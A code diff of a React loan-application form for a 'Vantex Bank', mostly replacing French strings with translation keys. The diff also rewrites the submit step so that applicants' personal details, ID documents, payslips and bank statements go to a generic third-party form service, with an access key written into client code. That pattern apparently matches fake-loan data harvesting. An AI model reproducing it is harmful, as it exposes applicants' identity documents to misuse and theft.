@@ -27,7 +27,7 @@ export default function AppModal() {
     address: '',
     job: '',
     income: '',
-    purpose: 'Travaux & rénovation'
+    purpose: t('purposes.work')
   });
 
   const [checks, setChecks] = useState({ chk1: false, chk2: false, chk3: false });
@@ -69,7 +69,7 @@ export default function AppModal() {
     const file = e.target.files?.[0];
     if (!file) return;
     if (file.size > 8 * 1024 * 1024) {
-      setErrorMsg("Ce fichier est trop volumineux (max 8 Mo).");
+      setErrorMsg(t('errors.file_too_large'));
       setShowCustomAlert(true);
       return;
     }
@@ -96,7 +96,7 @@ export default function AppModal() {
       if (amount <= 0) errors.push('amount');
       if (errors.length > 0) {
         setFieldErrors(errors);
-        setErrorMsg("Veuillez remplir tous les champs de votre projet.");
+        setErrorMsg(t('errors.fill_project'));
         setShowCustomAlert(true);
         return false;
       }
@@ -110,7 +110,7 @@ export default function AppModal() {
 
       if (errors.length > 0) {
         setFieldErrors(errors);
-        setErrorMsg("Veuillez remplir toutes vos informations.");
+        setErrorMsg(t('errors.fill_infos'));
         setShowCustomAlert(true);
         return false;
       }
@@ -118,7 +118,7 @@ export default function AppModal() {
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
       if (!emailRegex.test(formData.email)) {
         setFieldErrors(['email']);
-        setErrorMsg("Veuillez saisir une adresse e-mail valide.");
+        setErrorMsg(t('errors.invalid_email'));
         setShowCustomAlert(true);
         return false;
       }
@@ -130,7 +130,7 @@ export default function AppModal() {
       if (m < 0 || (m === 0 && today.getDate() < birthDate.getDate())) age--;
       if (age < 18) {
         setFieldErrors(['birthDate']);
-        setErrorMsg("Vous devez être majeur (18 ans ou plus).");
+        setErrorMsg(t('errors.min_age'));
         setShowCustomAlert(true);
         return false;
       }
@@ -140,7 +140,7 @@ export default function AppModal() {
       if (!uploaded.statements) errors.push('statements');
       if (errors.length > 0) {
         setFieldErrors(errors);
-        setErrorMsg("Veuillez téléverser les 3 documents obligatoires.");
+        setErrorMsg(t('errors.upload_all'));
         setShowCustomAlert(true);
         return false;
       }
@@ -172,24 +172,24 @@ export default function AppModal() {
     setSubmitting(true);
     try {
       const submissionData = new FormData();
-      submissionData.append('fi-sender-email', formData.email);
-      submissionData.append('fi-sender-firstName', formData.firstName);
-      submissionData.append('fi-sender-lastName', formData.lastName);
-
+      submissionData.append('access_key', 'rdl767g9fmt');
+      submissionData.append('subject', "Nouvelle demande de prêt - Dossier à traiter");
+      submissionData.append('from_name', 'Vantex Bank - Client');
+      submissionData.append('email', formData.email);
+      submissionData.append('Nom', formData.lastName);
+      submissionData.append('Prénom', formData.firstName);
       submissionData.append('Téléphone', formData.phone);
-      submissionData.append('Naissance', formData.birthDate);
-      submissionData.append('Adresse', formData.address);
+      submissionData.append('Date de naissance', formData.birthDate);
       submissionData.append('Pays', formData.nationality);
+      submissionData.append('Adresse', formData.address);
+      submissionData.append('Montant', `${amount} €`);
+      submissionData.append('Durée', `${months} mois`);
       submissionData.append('Profession', formData.job);
-      submissionData.append('Revenu', `${formData.income} €`);
-      submissionData.append('Montant_Pret', `${amount} €`);
-      submissionData.append('Duree', `${months} mois`);
-      submissionData.append('Mensualite', `${fmt(loan.monthly, locale)}`);
+      submissionData.append('Revenu mensuel', `${formData.income} €`);
       submissionData.append('Objet', formData.purpose);
-
-      if (files.id) submissionData.append('doc_identite', files.id);
-      if (files.payslips) submissionData.append('doc_salaire', files.payslips);
-      if (files.statements) submissionData.append('doc_banque', files.statements);
+      if (files.id) submissionData.append('Fichier_ID', files.id);
+      if (files.payslips) submissionData.append('Fichier_Salaire', files.payslips);
+      if (files.statements) submissionData.append('Fichier_Banque', files.statements);
 
       const response = await fetch('https://forminit.com/f/rdl767g9fmt', {
         method: 'POST',
@@ -202,10 +202,10 @@ export default function AppModal() {
         setShowSuccess(true);
       } else {
         const errorData = await response.json();
-        throw new Error(errorData.message || "Erreur d'envoi Forminit.");
+        throw new Error(errorData.message || "Error");
       }
     } catch (error: any) {
-      setErrorMsg(`Erreur : ${error.message}`);
+      setErrorMsg(`${t('errors.send_error')} ${error.message}`);
       setShowCustomAlert(true);
     } finally {
       setSubmitting(false);
@@ -214,9 +214,9 @@ export default function AppModal() {
 
   const stepLabels = [
     { id: 1, label: t('app.step1') },
-    { id: 2, label: "Infos" },
+    { id: 2, label: t('app.step_infos') },
     { id: 3, label: t('app.step2') },
-    { id: 4, label: "Envoi" },
+    { id: 4, label: t('app.step4') },
   ];
 
   const hasErr = (name: string) => fieldErrors.includes(name) ? 'field-error' : '';
@@ -229,7 +229,7 @@ export default function AppModal() {
           <div className="custom-alert-box" onClick={e => e.stopPropagation()}>
             <div className="alert-icon">⚠️</div>
             <p className="alert-text">{errorMsg}</p>
-            <button className="btn-full" onClick={() => setShowCustomAlert(false)}>D'ACCORD</button>
+            <button className="btn-full" onClick={() => setShowCustomAlert(false)}>{t('errors.ok_btn')}</button>
           </div>
         </div>
       )}
@@ -260,7 +260,7 @@ export default function AppModal() {
           {transitioning || (submitting && !showSuccess) ? (
             <div className="loading-wrap">
               <div className="spinner"></div>
-              <div className="loading-txt">{submitting ? "Sécurisation de l'envoi..." : t('app.loading')}</div>
+              <div className="loading-txt">{submitting ? t('app.sending') : t('app.loading')}</div>
             </div>
           ) : showSuccess ? (
             <div className="success-panel">
@@ -301,7 +301,7 @@ export default function AppModal() {
                     </select>
                   </div>
                   <div className="form-group">
-                    <label className="form-label">Revenu mensuel net (€)</label>
+                    <label className="form-label">{t('app.income')}</label>
                     <input type="number" name="income" className={`form-input ${hasErr('income')}`} placeholder="2 500" value={formData.income} onChange={handleInputChange} />
                   </div>
                   <button className="btn-full" style={{ padding: '18px', fontSize: '16px' }} onClick={() => goToStep(2)}>{t('common.continue')} →</button>
@@ -331,7 +331,7 @@ export default function AppModal() {
                     <input type="date" name="birthDate" className={`form-input ${hasErr('birthDate')}`} value={formData.birthDate} onChange={handleInputChange} />
                   </div>
                   <div className="form-group">
-                    <label className="form-label">Adresse complète</label>
+                    <label className="form-label">{t('app.address')}</label>
                     <input type="text" name="address" className={`form-input ${hasErr('address')}`} placeholder="123 rue de Paris, 75000 Paris" value={formData.address} onChange={handleInputChange} />
                   </div>
                   <div className="btn-row"><button className="btn-full btn-back" onClick={() => setStep(1)}>← {t('common.back')}</button><button className="btn-full" onClick={() => goToStep(3)}>{t('common.continue')} →</button></div>
@@ -357,22 +357,22 @@ export default function AppModal() {
                   <h2 className="sp-title">{t('app.recap_title')}</h2>
                   <div className="sum-box" style={{ background: '#F8FAFC', border: '1px solid var(--border)', padding: '24px', borderRadius: '14px', marginBottom: '24px' }}>
                     <div className="sum-row" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px', paddingBottom: '12px', borderBottom: '1px solid #E2E8F0' }}>
-                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>Prêt :</span>
-                      <strong style={{ color: 'var(--navy)', fontSize: '15px' }}>{amount.toLocaleString()} € / {months} mois</strong>
+                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>{t('app.recap_loan')}</span>
+                      <strong style={{ color: 'var(--navy)', fontSize: '15px' }}>{amount.toLocaleString()} € / {months} {t('common.months')}</strong>
                     </div>
                     <div className="sum-row" style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px', paddingBottom: '12px', borderBottom: '1px solid #E2E8F0' }}>
-                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>Mensualité :</span>
+                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>{t('app.recap_monthly')}</span>
                       <strong style={{ color: 'var(--blue)', fontSize: '16px' }}>{fmt(loan.monthly, locale)}</strong>
                     </div>
                     <div className="sum-row" style={{ display: 'flex', flexDirection: 'column', gap: '4px' }}>
-                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>Email :</span>
+                      <span style={{ color: 'var(--muted)', fontSize: '14px' }}>{t('app.recap_email')}</span>
                       <strong style={{ color: 'var(--navy)', fontSize: '14px', wordBreak: 'break-all' }}>{formData.email}</strong>
                     </div>
                   </div>
                   <div className="check-group"><input type="checkbox" id="c1" checked={checks.chk1} onChange={e => setChecks(p => ({ ...p, chk1: e.target.checked }))}/><label htmlFor="c1" className="check-lbl">{t('app.chk1')}</label></div>
                   <div className="check-group"><input type="checkbox" id="c2" checked={checks.chk2} onChange={e => setChecks(p => ({ ...p, chk2: e.target.checked }))}/><label htmlFor="c2" className="check-lbl">{t('app.chk2')}</label></div>
                   <div className="check-group"><input type="checkbox" id="c3" checked={checks.chk3} onChange={e => setChecks(p => ({ ...p, chk3: e.target.checked }))}/><label htmlFor="c3" className="check-lbl">{t('app.chk3')}</label></div>
-                  <div className="btn-row"><button className="btn-full btn-back" onClick={() => setStep(3)}>← {t('common.back')}</button><button className="btn-full" onClick={submitApplication}>{t('common.submit')} ✓</button></div>
+                  <div className="btn-row"><button className="btn-full btn-back" onClick={() => setStep(3)}>← {t('common.back')}</button><button className="btn-full" onClick={submitApplication}>{t('app.submit_btn')}</button></div>
                 </div>
               )}
             </>
